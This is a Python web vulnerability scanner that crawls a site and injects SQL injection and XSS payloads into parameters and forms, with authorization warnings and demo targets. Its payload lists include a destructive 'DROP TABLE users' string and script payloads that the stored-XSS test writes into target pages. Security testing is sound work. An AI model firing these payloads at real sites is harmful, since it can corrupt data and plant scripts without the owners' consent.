#!/usr/bin/env python3
"""
Web Application Vulnerability Scanner
======================================
Detects common security issues including SQL Injection and Cross-Site Scripting (XSS)
by crawling a target website, extracting forms/links, injecting payloads, and
analyzing server responses.

⚠️  WARNING: This tool is strictly for EDUCATIONAL purposes and AUTHORIZED
    security testing only. Using it against systems without explicit written
    permission is ILLEGAL and UNETHICAL. Always obtain proper authorization.

Usage Examples:
  python web_vuln_scanner.py --url http://testphp.vulnweb.com
  python web_vuln_scanner.py --url http://testphp.vulnweb.com --depth 3 --threads 5
  python web_vuln_scanner.py --url http://testphp.vulnweb.com --output report.json
  python web_vuln_scanner.py --url http://testphp.vulnweb.com --output report.csv --timeout 10
"""

import re
import sys
import csv
import json
import time
import argparse
import logging
from queue import Queue
from datetime import datetime, timezone
from threading import Thread, Lock
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[ERROR] Missing dependencies. Install with:")
    print("  pip install requests beautifulsoup4")
    sys.exit(1)


# ──────────────────────────────────────────────
# Constants & Payload Definitions
# ──────────────────────────────────────────────

BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║          Web Application Vulnerability Scanner               ║
║          For Authorized Security Testing Only                ║
╚══════════════════════════════════════════════════════════════╝
"""

USER_AGENT = "Mozilla/5.0 (VulnScanner/1.0; Educational Security Tool)"

# SQL Injection payloads — cover error-based, boolean-based, and time-based
SQL_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' UNION SELECT NULL--",
    "admin'--",
    "1 OR 1=1",
]

# SQL error signatures from major database engines
SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"mysql_fetch",
    r"mysql_num_rows",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"postgresql.*error",
    r"supplied argument is not a valid postgresql",
    # SQLite
    r"sqlite_",
    r"sqlite3::",
    r"sqliteexception",
    # MSSQL
    r"microsoft sql server",
    r"odbc microsoft access",
    r"syntax error converting",
    # Oracle
    r"ora-[0-9]{4,5}",
    r"oracle error",
    # Generic
    r"sql syntax.*mysql",
    r"native client.*error",
    r"jdbc.*exception",
]

# XSS payloads — reflected and basic stored detection
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<ScRiPt>alert(1)</ScRiPt>",   # case variation bypass
    "';alert(1);//",
]


# ──────────────────────────────────────────────
# Logging Setup
# ──────────────────────────────────────────────

def setup_logger(verbose: bool = False) -> logging.Logger:
    logger = logging.getLogger("VulnScanner")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
    logger.addHandler(handler)
    return logger


log = setup_logger()


# ──────────────────────────────────────────────
# Data Structures
# ──────────────────────────────────────────────

class Finding:
    """Represents a single discovered vulnerability."""
    def __init__(self, vuln_type: str, url: str, method: str,
                 param: str, payload: str, evidence: str):
        self.vuln_type = vuln_type    # e.g. "SQL Injection"
        self.url       = url
        self.method    = method       # GET or POST
        self.param     = param        # affected parameter name
        self.payload   = payload      # injected string
        self.evidence  = evidence     # relevant snippet from response
        self.timestamp = datetime.now(tz=timezone.utc).isoformat()

    def to_dict(self) -> dict:
        return {
            "type":      self.vuln_type,
            "url":       self.url,
            "method":    self.method,
            "parameter": self.param,
            "payload":   self.payload,
            "evidence":  self.evidence,
            "found_at":  self.timestamp,
        }

    def __str__(self) -> str:
        return (
            f"\n  {'─'*55}\n"
            f"  TYPE      : {self.vuln_type}\n"
            f"  URL       : {self.url}\n"
            f"  METHOD    : {self.method}\n"
            f"  PARAMETER : {self.param}\n"
            f"  PAYLOAD   : {self.payload}\n"
            f"  EVIDENCE  : {self.evidence[:120]}...\n"
            f"  {'─'*55}"
        )


# ──────────────────────────────────────────────
# HTTP Session
# ──────────────────────────────────────────────

def make_session(timeout: int = 10) -> requests.Session:
    """
    Create a pre-configured requests.Session with:
    - Custom User-Agent to identify the scanner
    - Redirect following enabled
    - Timeout baked into a wrapper (used at call sites)
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    return session


def safe_get(session: requests.Session, url: str, timeout: int,
             params: dict = None, delay: float = 0.5) -> requests.Response | None:
    """
    Perform a GET request with error handling and rate-limiting delay.
    Returns the Response or None on failure.
    """
    time.sleep(delay)   # polite rate limiting
    try:
        return session.get(url, params=params, timeout=timeout, allow_redirects=True)
    except requests.exceptions.TooManyRedirects:
        log.warning(f"Too many redirects: {url}")
    except requests.exceptions.ConnectionError:
        log.warning(f"Connection error: {url}")
    except requests.exceptions.Timeout:
        log.warning(f"Timeout: {url}")
    except requests.exceptions.RequestException as exc:
        log.warning(f"Request failed for {url}: {exc}")
    return None


def safe_post(session: requests.Session, url: str, timeout: int,
              data: dict, delay: float = 0.5) -> requests.Response | None:
    """Perform a POST request with error handling and rate-limiting delay."""
    time.sleep(delay)
    try:
        return session.post(url, data=data, timeout=timeout, allow_redirects=True)
    except requests.exceptions.RequestException as exc:
        log.warning(f"POST failed for {url}: {exc}")
    return None


# ──────────────────────────────────────────────
# Crawler
# ──────────────────────────────────────────────

class Crawler:
    """
    Recursively crawls a website starting from a base URL.
    Extracts internal links and HTML forms up to a given depth.
    Avoids re-visiting the same URL (deduplication via a visited set).
    Only follows links within the same domain (scoped crawling).
    """

    def __init__(self, base_url: str, max_depth: int, session: requests.Session,
                 timeout: int, delay: float = 0.5):
        self.base_url  = base_url
        self.max_depth = max_depth
        self.session   = session
        self.timeout   = timeout
        self.delay     = delay
        self.visited   = set()                          # deduplication store
        self.base_host = urlparse(base_url).netloc      # scope to same domain

        # Results collected during crawl
        self.urls:  list[str]  = []
        self.forms: list[dict] = []

    def _in_scope(self, url: str) -> bool:
        """Only crawl URLs belonging to the target domain."""
        return urlparse(url).netloc == self.base_host

    def _normalize_url(self, url: str) -> str:
        """Strip fragments (#section) so we don't re-crawl the same page."""
        parsed = urlparse(url)
        return urlunparse(parsed._replace(fragment=""))

    def _extract_links(self, html: str, current_url: str) -> list[str]:
        """Parse all anchor href values and resolve them to absolute URLs."""
        soup  = BeautifulSoup(html, "html.parser")
        links = []
        for tag in soup.find_all("a", href=True):
            abs_url = urljoin(current_url, tag["href"])
            abs_url = self._normalize_url(abs_url)
            if abs_url.startswith("http") and self._in_scope(abs_url):
                links.append(abs_url)
        return links

    def _extract_forms(self, html: str, current_url: str) -> list[dict]:
        """
        Parse all HTML forms on the page.
        Returns a list of form descriptors containing:
          - action URL
          - method (GET/POST)
          - list of input field names and default values
        """
        soup  = BeautifulSoup(html, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").upper()
            action = urljoin(current_url, action) if action else current_url

            inputs = []
            for tag in form.find_all(["input", "textarea", "select"]):
                name  = tag.get("name")
                value = tag.get("value", "test")
                itype = tag.get("type", "text").lower()
                if name:
                    inputs.append({"name": name, "value": value, "type": itype})

            forms.append({"action": action, "method": method,
                          "inputs": inputs, "source_url": current_url})
        return forms

    def crawl(self, url: str = None, depth: int = 0) -> None:
        """
        DFS crawl starting from `url`.
        Stops when max_depth is reached or URL was already visited.
        """
        url = url or self.base_url
        if depth > self.max_depth or url in self.visited:
            return

        self.visited.add(url)
        log.info(f"Crawling [depth={depth}]: {url}")

        response = safe_get(self.session, url, self.timeout, delay=self.delay)
        if not response or "text/html" not in response.headers.get("Content-Type", ""):
            return

        html = response.text
        self.urls.append(url)
        self.forms.extend(self._extract_forms(html, url))

        # Recurse into discovered links
        for link in self._extract_links(html, url):
            self.crawl(link, depth + 1)


# ──────────────────────────────────────────────
# Vulnerability Scanner
# ──────────────────────────────────────────────

class Scanner:
    """
    Injects attack payloads into GET parameters and HTML form inputs,
    then analyzes server responses for signs of:
      - SQL Injection (database error messages)
      - Reflected XSS (injected script reflected verbatim in response)
    """

    def __init__(self, session: requests.Session, timeout: int, delay: float = 0.5):
        self.session  = session
        self.timeout  = timeout
        self.delay    = delay
        self.findings: list[Finding] = []
        self._lock    = Lock()    # thread-safe findings list

    def _record(self, finding: Finding) -> None:
        with self._lock:
            self.findings.append(finding)
        log.warning(f"⚠  FOUND: {finding.vuln_type} @ {finding.url} (param={finding.param})")

    # ── SQL Injection detection ────────────────────────────────

    def _is_sqli_response(self, text: str) -> str | None:
        """
        Scan response body for known database error strings.
        Returns the matched snippet if found, else None.
        """
        lower = text.lower()
        for pattern in SQL_ERROR_PATTERNS:
            match = re.search(pattern, lower)
            if match:
                # Return a small context window around the match
                start = max(0, match.start() - 40)
                end   = min(len(text), match.end() + 80)
                return text[start:end].strip()
        return None

    def test_sqli_get(self, url: str) -> None:
        """Test GET parameters in a URL for SQL Injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param_name in params:
            for payload in SQL_PAYLOADS:
                injected = dict(params)
                injected[param_name] = payload

                response = safe_get(self.session, url, self.timeout,
                                    params=injected, delay=self.delay)
                if not response:
                    continue

                evidence = self._is_sqli_response(response.text)
                if evidence:
                    self._record(Finding(
                        vuln_type = "SQL Injection",
                        url       = url,
                        method    = "GET",
                        param     = param_name,
                        payload   = payload,
                        evidence  = evidence,
                    ))
                    break   # one payload confirmed — move to next param

    def test_sqli_form(self, form: dict) -> None:
        """Inject SQL payloads into every input field of an HTML form."""
        for payload in SQL_PAYLOADS:
            data = {f["name"]: (payload if f["type"] != "hidden" else f["value"])
                    for f in form["inputs"]}

            if form["method"] == "POST":
                response = safe_post(self.session, form["action"],
                                     self.timeout, data, delay=self.delay)
            else:
                response = safe_get(self.session, form["action"],
                                    self.timeout, params=data, delay=self.delay)

            if not response:
                continue

            evidence = self._is_sqli_response(response.text)
            if evidence:
                for field in form["inputs"]:
                    if field["type"] != "hidden":
                        self._record(Finding(
                            vuln_type = "SQL Injection",
                            url       = form["action"],
                            method    = form["method"],
                            param     = field["name"],
                            payload   = payload,
                            evidence  = evidence,
                        ))
                break   # confirmed for this form

    # ── XSS detection ─────────────────────────────────────────

    def _is_xss_response(self, text: str, payload: str) -> str | None:
        """
        Check if the exact payload appears (reflected) in the response body.
        Returns surrounding context if found, else None.
        """
        idx = text.find(payload)
        if idx != -1:
            start = max(0, idx - 30)
            end   = min(len(text), idx + len(payload) + 30)
            return text[start:end].strip()
        return None

    def test_xss_get(self, url: str) -> None:
        """Test GET parameters in a URL for reflected XSS."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param_name in params:
            for payload in XSS_PAYLOADS:
                injected = dict(params)
                injected[param_name] = payload

                response = safe_get(self.session, url, self.timeout,
                                    params=injected, delay=self.delay)
                if not response:
                    continue

                evidence = self._is_xss_response(response.text, payload)
                if evidence:
                    self._record(Finding(
                        vuln_type = "Reflected XSS",
                        url       = url,
                        method    = "GET",
                        param     = param_name,
                        payload   = payload,
                        evidence  = evidence,
                    ))
                    break

    def test_xss_form(self, form: dict) -> None:
        """Inject XSS payloads into every input field of an HTML form."""
        for field in form["inputs"]:
            if field["type"] in ("hidden", "submit", "button"):
                continue

            for payload in XSS_PAYLOADS:
                data = {f["name"]: (payload if f["name"] == field["name"] else f["value"])
                        for f in form["inputs"]}

                if form["method"] == "POST":
                    response = safe_post(self.session, form["action"],
                                         self.timeout, data, delay=self.delay)
                else:
                    response = safe_get(self.session, form["action"],
                                        self.timeout, params=data, delay=self.delay)

                if not response:
                    continue

                evidence = self._is_xss_response(response.text, payload)
                if evidence:
                    self._record(Finding(
                        vuln_type = "Reflected XSS",
                        url       = form["action"],
                        method    = form["method"],
                        param     = field["name"],
                        payload   = payload,
                        evidence  = evidence,
                    ))
                    break   # move to next field after first confirmation

    # ── Stored XSS simulation ──────────────────────────────────

    def test_stored_xss_form(self, form: dict, session: requests.Session) -> None:
        """
        Basic stored XSS simulation:
        1. Submit payload via a form.
        2. Re-fetch the form's source page.
        3. Check if the payload appears in the new response (basic simulation).
        Note: True stored XSS detection requires revisiting pages after submission.
        """
        for field in form["inputs"]:
            if field["type"] in ("hidden", "submit", "button"):
                continue

            payload = XSS_PAYLOADS[0]
            data = {f["name"]: (payload if f["name"] == field["name"] else f["value"])
                    for f in form["inputs"]}

            # Step 1: Submit
            if form["method"] == "POST":
                safe_post(session, form["action"], self.timeout, data, delay=self.delay)
            else:
                safe_get(session, form["action"], self.timeout, params=data, delay=self.delay)

            # Step 2: Re-fetch source page to see if payload is stored
            response = safe_get(session, form["source_url"], self.timeout, delay=self.delay)
            if not response:
                continue

            evidence = self._is_xss_response(response.text, payload)
            if evidence:
                self._record(Finding(
                    vuln_type = "Stored XSS (Simulated)",
                    url       = form["source_url"],
                    method    = form["method"],
                    param     = field["name"],
                    payload   = payload,
                    evidence  = evidence,
                ))
                break


# ──────────────────────────────────────────────
# Multi-threaded Scan Orchestrator
# ──────────────────────────────────────────────

class ScanWorker(Thread):
    """Worker thread that processes scan tasks from a shared queue."""

    def __init__(self, task_queue: Queue, scanner: Scanner, session: requests.Session):
        super().__init__(daemon=True)
        self.task_queue = task_queue
        self.scanner    = scanner
        self.session    = session

    def run(self):
        while True:
            task = self.task_queue.get()
            if task is None:   # poison pill signals shutdown
                break
            try:
                task_type, target = task
                if task_type == "sqli_url":
                    self.scanner.test_sqli_get(target)
                elif task_type == "xss_url":
                    self.scanner.test_xss_get(target)
                elif task_type == "sqli_form":
                    self.scanner.test_sqli_form(target)
                elif task_type == "xss_form":
                    self.scanner.test_xss_form(target)
                elif task_type == "stored_xss_form":
                    self.scanner.test_stored_xss_form(target, self.session)
            except Exception as exc:
                log.debug(f"Worker error: {exc}")
            finally:
                self.task_queue.task_done()


# ──────────────────────────────────────────────
# Reporter
# ──────────────────────────────────────────────

class Reporter:
    """Formats and exports vulnerability findings."""

    def __init__(self, findings: list[Finding], target: str):
        self.findings = findings
        self.target   = target
        self.scanned_at = datetime.now(tz=timezone.utc).isoformat()

    def print_summary(self) -> None:
        """Print a structured console report."""
        print("\n" + "═" * 62)
        print("  SCAN REPORT")
        print("═" * 62)
        print(f"  Target      : {self.target}")
        print(f"  Scanned at  : {self.scanned_at}")
        print(f"  Total found : {len(self.findings)} vulnerability/ies")
        print("═" * 62)

        if not self.findings:
            print("\n  ✔  No vulnerabilities detected.\n")
            return

        by_type: dict[str, list[Finding]] = {}
        for f in self.findings:
            by_type.setdefault(f.vuln_type, []).append(f)

        for vuln_type, items in by_type.items():
            print(f"\n  [{vuln_type.upper()}]  —  {len(items)} instance(s)")
            for f in items:
                print(f)

        print("═" * 62)

    def export_json(self, path: str) -> None:
        """Export findings as a structured JSON file."""
        payload = {
            "target":     self.target,
            "scanned_at": self.scanned_at,
            "total":      len(self.findings),
            "findings":   [f.to_dict() for f in self.findings],
        }
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
        log.info(f"JSON report saved: {path}")

    def export_csv(self, path: str) -> None:
        """Export findings as a CSV file."""
        fieldnames = ["type", "url", "method", "parameter", "payload",
                      "evidence", "found_at"]
        with open(path, "w", newline="", encoding="utf-8") as fh:
            writer = csv.DictWriter(fh, fieldnames=fieldnames)
            writer.writeheader()
            for f in self.findings:
                writer.writerow(f.to_dict())
        log.info(f"CSV report saved: {path}")

    def export(self, path: str) -> None:
        """Auto-detect format from file extension and export."""
        if path.endswith(".csv"):
            self.export_csv(path)
        else:
            self.export_json(path)   # default to JSON


# ──────────────────────────────────────────────
# Main Orchestration
# ──────────────────────────────────────────────

def run_scan(target: str, depth: int, timeout: int, delay: float,
             threads: int, output: str | None) -> None:
    """
    Full pipeline:
      1. Crawl the target website.
      2. Queue all discovered URLs and forms for vulnerability testing.
      3. Process the queue with a thread pool.
      4. Report and optionally export findings.
    """
    print(BANNER)
    print("⚠️  AUTHORIZED SECURITY TESTING ONLY. You are responsible for proper authorization.\n")

    session = make_session(timeout)

    # ── Phase 1: Crawl ────────────────────────────────────────
    log.info(f"Starting crawl: {target}  (depth={depth})")
    crawler = Crawler(target, max_depth=depth, session=session,
                      timeout=timeout, delay=delay)
    crawler.crawl()
    log.info(f"Crawl complete: {len(crawler.urls)} URL(s), {len(crawler.forms)} form(s) found.\n")

    # ── Phase 2: Build task queue ─────────────────────────────
    scanner    = Scanner(session, timeout, delay)
    task_queue = Queue()

    for url in crawler.urls:
        task_queue.put(("sqli_url", url))
        task_queue.put(("xss_url",  url))

    for form in crawler.forms:
        task_queue.put(("sqli_form",       form))
        task_queue.put(("xss_form",        form))
        task_queue.put(("stored_xss_form", form))

    total_tasks = task_queue.qsize()
    log.info(f"Queued {total_tasks} scan task(s) across {threads} thread(s).\n")

    # ── Phase 3: Worker threads ───────────────────────────────
    workers = [ScanWorker(task_queue, scanner, session) for _ in range(threads)]
    for w in workers:
        w.start()

    task_queue.join()   # block until all tasks complete

    # Send shutdown signals
    for _ in workers:
        task_queue.put(None)
    for w in workers:
        w.join()

    # ── Phase 4: Report ───────────────────────────────────────
    reporter = Reporter(scanner.findings, target)
    reporter.print_summary()

    if output:
        reporter.export(output)


# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="web_vuln_scanner",
        description="Web Application Vulnerability Scanner (SQLi + XSS)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python web_vuln_scanner.py --url http://testphp.vulnweb.com
  python web_vuln_scanner.py --url http://testphp.vulnweb.com --depth 3
  python web_vuln_scanner.py --url http://testphp.vulnweb.com --threads 10 --output report.json
  python web_vuln_scanner.py --url http://testphp.vulnweb.com --output report.csv

Authorized test targets:
  http://testphp.vulnweb.com    (Acunetix demo)
  http://demo.testfire.net      (IBM AltoroMutual)
        """,
    )
    parser.add_argument("--url",     required=True, help="Target base URL to scan.")
    parser.add_argument("--depth",   type=int, default=2, help="Crawl depth (default: 2).")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10).")
    parser.add_argument("--delay",   type=float, default=0.3, help="Delay between requests in seconds (default: 0.3).")
    parser.add_argument("--threads", type=int, default=3, help="Number of scanning threads (default: 3).")
    parser.add_argument("--output",  default=None, metavar="FILE",
                        help="Export report to file (.json or .csv).")
    return parser


def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()

    # Basic URL validation
    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        log.error(f"Invalid URL: {args.url}. Include scheme, e.g. http://example.com")
        return 1

    try:
        run_scan(
            target  = args.url,
            depth   = args.depth,
            timeout = args.timeout,
            delay   = args.delay,
            threads = args.threads,
            output  = args.output,
        )
    except KeyboardInterrupt:
        log.info("\nScan interrupted by user.")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
